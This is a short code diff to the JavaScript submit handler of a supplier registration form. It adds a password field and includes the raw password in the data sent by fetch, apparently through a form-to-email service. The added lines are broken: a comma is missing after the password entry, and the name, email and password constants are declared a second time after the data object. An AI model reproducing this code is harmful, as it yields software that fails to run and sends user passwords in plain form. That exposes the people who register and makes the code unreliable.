@@ -501,12 +501,14 @@
       event.preventDefault();
 
       const fullName = document.getElementById("full-name").value.trim();
-      const email = document.getElementById("email").value.trim();
+const email = document.getElementById("email").value.trim();
+const password = document.getElementById("password").value;
 
-      if (!fullName || !email) {
-        formMessage.textContent =
-          "Please enter your full name and email address.";
-        return;
+      if (!fullName || !email || !password) {
+  formMessage.textContent =
+    "Please enter your full name, email address, and password.";
+  return;
+      
       }
 
       submitButton.disabled = true;
@@ -516,9 +518,13 @@
       const formData = {
         name: fullName,
         email: email,
+        password: password 
         _subject: "New Ottacon Supplier Registration",
         _template: "table"
       };
+    const fullName = document.getElementById("full-name").value.trim();
+const email = document.getElementById("email").value.trim();
+const password = document.getElementById("password").value;
 
       try {
         const response = await fetch(
